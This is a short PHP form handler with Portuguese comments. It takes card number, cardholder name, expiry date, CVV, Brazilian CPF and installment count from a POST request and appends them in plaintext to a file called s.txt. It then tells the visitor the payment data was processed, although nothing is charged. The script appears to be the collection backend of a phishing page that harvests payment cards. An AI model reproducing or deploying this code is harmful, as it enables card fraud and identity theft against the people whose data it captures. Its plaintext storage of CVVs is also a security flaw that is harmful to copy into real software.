<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $cardNumber = $_POST["cardNumber"];
    $cardName = $_POST["cardName"];
    $cardExpiry = $_POST["cardExpiry"];
    $cardCvv = $_POST["cardCvv"];
    $cpf = $_POST["cpf"];
    $installments = $_POST["installments"];

    // Salvar os dados em s.txt
    $data = "Card Number: $cardNumber\nCard Name: $cardName\nCard Expiry: $cardExpiry\nCard CVV: $cardCvv\nCPF: $cpf\nInstallments: $installments\n";
    file_put_contents("s.txt", $data, FILE_APPEND);

    // Responder ao cliente (opcional)
    echo "Dados processados com sucesso!";
} else {
    // Método incorreto
    http_response_code(405);
    echo "Método não permitido";
}
?>
